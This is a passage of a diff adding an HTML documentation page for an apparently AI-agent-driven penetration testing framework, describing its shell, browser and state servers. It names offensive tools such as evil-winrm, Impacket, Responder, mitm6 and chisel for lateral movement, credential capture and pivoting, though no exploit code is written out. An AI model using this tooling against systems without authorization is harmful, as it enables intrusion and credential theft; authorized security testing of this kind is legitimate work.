+<td>evil-winrm</td>
+</tr>
+<tr>
+<td>Impacket</td>
+<td>psexec.py, wmiexec.py, smbexec.py, smbclient.py, mssqlclient.py, dpapi.py</td>
+</tr>
+<tr>
+<td>DPAPI/EFS</td>
+<td>dpapick3 (handles CAPI key containers that impacket can't parse)</td>
+</tr>
+<tr>
+<td>Pivoting</td>
+<td>chisel, ligolo-ng proxy, socat</td>
+</tr>
+<tr>
+<td>Poisoning</td>
+<td>Responder, mitm6</td>
+</tr>
+<tr>
+<td>Capture</td>
+<td>tcpdump</td>
+</tr>
+<tr>
+<td>SSH</td>
+<td>openssh-client</td>
+</tr>
+</tbody>
+</table>
+<p>Containers run with <code>--network=host</code> to share the host's network namespace including VPN tunnels.</p>
+<h3 id="transcripts">Transcripts</h3>
+<p>Every send/recv is logged in real-time to <code>engagement/evidence/shell-{id}-{label}.log</code>. On <code>close_session(save_transcript=true)</code>, the log path is returned.</p>
+<hr />
+<h2 id="browser-server">browser-server</h2>
+<p><strong>Location:</strong> <code>tools/browser-server/</code> · <strong>11 tools</strong></p>
+<p>Headless Chromium automation via Playwright. Handles CSRF tokens, session cookies, JavaScript-rendered forms, and multi-step auth flows that curl can't manage. Each session maintains its own cookie jar and localStorage.</p>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>browser_open(url, ignore_tls=true, proxy="")</code></td>
+<td>Create session + navigate, optionally through an upstream proxy such as Burp</td>
+</tr>
+<tr>
+<td><code>browser_navigate(session_id, url)</code></td>
+<td>Navigate within existing session</td>
+</tr>
+<tr>
+<td><code>browser_get_page(session_id, selector?)</code></td>
+<td>Re-read page content, optionally scoped by CSS selector</td>
+</tr>
+<tr>
+<td><code>browser_click(session_id, selector, wait_until="load")</code></td>
+<td>Click element and wait for navigation</td>
+</tr>
+<tr>
+<td><code>browser_fill(session_id, selector, value)</code></td>
+<td>Fill a form field</td>
+</tr>
+<tr>
+<td><code>browser_select(session_id, selector, value)</code></td>
+<td>Select dropdown option</td>
+</tr>
+<tr>
+<td><code>browser_screenshot(session_id, save_to?)</code></td>
+<td>Take full-page PNG screenshot</td>
+</tr>
+<tr>
+<td><code>browser_cookies(session_id)</code></td>
+<td>Get all cookies as JSON</td>
+</tr>
+<tr>
+<td><code>browser_evaluate(session_id, expression)</code></td>
+<td>Run JavaScript in page context</td>
+</tr>
+<tr>
+<td><code>close_browser(session_id)</code></td>
+<td>Close session and free resources</td>
+</tr>
+<tr>
+<td><code>list_browser_sessions()</code></td>
+<td>List active sessions</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Content handling:</strong> HTML is converted to markdown via <code>markdownify</code>. Scripts and styles are stripped. Output capped at 50KB — use <code>browser_get_page</code> with a CSS selector to scope large pages.</p>
+<p><strong>Session isolation:</strong> Each <code>browser_open</code> creates a new Chromium browser context with its own cookie jar, localStorage, and cache. TLS errors are ignored by default for self-signed pentesting targets.</p>
+<p><strong>Proxy support:</strong> <code>browser_open(..., proxy="http://127.0.0.1:8080")</code> launches or reuses a Chromium instance bound to that upstream proxy, which makes it suitable for Burp capture. Different proxy values get separate browser instances; direct sessions stay isolated from proxied ones. If <code>proxy</code> is omitted, the server also checks <code>engagement/web-proxy.json</code> and uses the orchestrator-recorded Burp listener when enabled.</p>
+<p><strong>When to use browser vs curl:</strong> Browser tools are the default for navigating sites and managing sessions. Use curl as fallback for precise payload control in injection testing.</p>
+<hr />
+<h2 id="state-server">state-server</h2>
+<p><strong>Location:</strong> <code>tools/state-server/</code> · <strong>1 instance, full read/write tools</strong></p>
+<p>SQLite-backed engagement state management. In agent teams mode, all writes are centralized through the <strong>state-mgr teammate</strong> — the sole writer to state.db. State-mgr applies LLM-level dedup, enforces provenance links (technique-vuln linkage, access chain provenance), and notifies the lead of new findings. Other teammates and the lead read state directly.</p>
+<p>SQLite WAL mode + <code>busy_timeout=5000</code> handles concurrent access safely. DB-level deduplication (UNIQUE constraints) remains as a safety net behind state-mgr's judgment.</p>
+<p>See <a href="../engagement-state/">Engagement State</a> for the full schema and how state drives vulnerability chaining.</p>
+<hr />
+<h2 id="server-details">Server details</h2>
+<p>For complete documentation of each server — parameters, environment variables, architecture, and edge cases — see the README in each server's directory:</p>
+<ul>
+<li><a href="https://github.com/blacklanternsecurity/red-run/blob/main/tools/skill-router/README.md"><code>tools/skill-router/README.md</code></a></li>
+<li><a href="https://github.com/blacklanternsecurity/red-run/blob/main/tools/nmap-server/README.md"><code>tools/nmap-server/README.md</code></a></li>
+<li><a href="https://github.com/blacklanternsecurity/red-run/blob/main/tools/shell-server/README.md"><code>tools/shell-server/README.md</code></a></li>
+<li><a href="https://github.com/blacklanternsecurity/red-run/blob/main/tools/browser-server/README.md"><code>tools/browser-server/README.md</code></a></li>
+<li><a href="https://github.com/blacklanternsecurity/red-run/blob/main/tools/state-server/README.md"><code>tools/state-server/README.md</code></a></li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["navigation.sections", "navigation.expand", "content.code.copy", "search.suggest"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
